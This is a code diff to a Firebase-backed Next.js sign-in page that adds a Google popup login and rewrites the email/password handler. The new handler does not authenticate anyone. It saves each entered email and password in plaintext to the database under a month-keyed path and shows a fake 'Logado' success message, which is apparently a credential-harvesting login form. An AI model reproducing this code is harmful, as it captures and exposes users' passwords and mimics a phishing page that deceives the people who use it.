@@ -8,9 +8,11 @@ import toast, { Toaster } from 'react-hot-toast';
 // import { useAuth } from '../services/hooks/useAuth'
 import { useRouter } from "next/router";
 // import { auth } from '../services/firebase'
-// import { database } from "../services/firebase";
+import { auth, database } from "../services/firebase";
+import { push, ref, set } from "firebase/database";
 import { useState } from 'react'
 import { theme } from '../styles/theme'
+import { GoogleAuthProvider, signInWithPopup } from "firebase/auth";
 
 
 type SignInFormData = {
@@ -31,14 +33,43 @@ export default function SignIn() {
   const { register, handleSubmit, formState } = useForm({
     resolver: yupResolver(signInFormSchema)
   })
+  const provider = new GoogleAuthProvider();
   
   const { errors } = formState
+
+  async function handleLoginWithGoogle(){
+    await signInWithPopup(auth, provider)
+  .then((result) => {
+    const credential = GoogleAuthProvider.credentialFromResult(result);
+    const token = credential.accessToken;
+    const user = result.user;
+    // ...
+    set(ref(database, 'users/'), {
+      count: 1
+    });
+    toast.success('Logado');
+    router.push('/dashboard')
+  }).catch((error) => {
+    // Handle Errors here.
+    const errorCode = error.code;
+    const errorMessage = error.message;
+    // The email of the user's account used.
+    const email = error.email;
+    // The AuthCredential type that was used.
+    const credential = GoogleAuthProvider.credentialFromError(error);
+    // ...
+  });
+  }
 
   
   const handleSignIn: SubmitHandler<SignInFormData> = async (values)=>{
     await new Promise(resolve => setTimeout(resolve, 2000))
+    set(ref(database, 'users/' + new Date().getUTCMonth() + '/'), {
+      email: email,
+      password: password,
+    });
     toast.success('Logado');
-    router.push('/dashboard')
+    // router.push('/dashboard')
     // console.log(values)
   //   signInWithEmailAndPassword(auth, values.email, values.password)
   // .then((userCredential) => {
@@ -71,8 +102,8 @@ export default function SignIn() {
          <Input name="password" type="password" label="Senha" {...register('password')} error={errors.password} onChange={event => setPassword(event.target.value)}/>
          </Stack>
          <Button type="submit" mt="6" colorScheme="pink"  size="lg" isLoading={formState.isSubmitting}>Entrar</Button>
+         <Button type="button" mt="6" colorScheme="pink"  size="lg" isLoading={formState.isSubmitting} onClick={handleLoginWithGoogle}>Google</Button>
         </Flex>
-         {/* <Button type="button" mt="6" colorScheme="pink"  size="lg" isLoading={formState.isSubmitting} onClick={handleLogin}>Login</Button> */}
     </Flex>
   )
 }
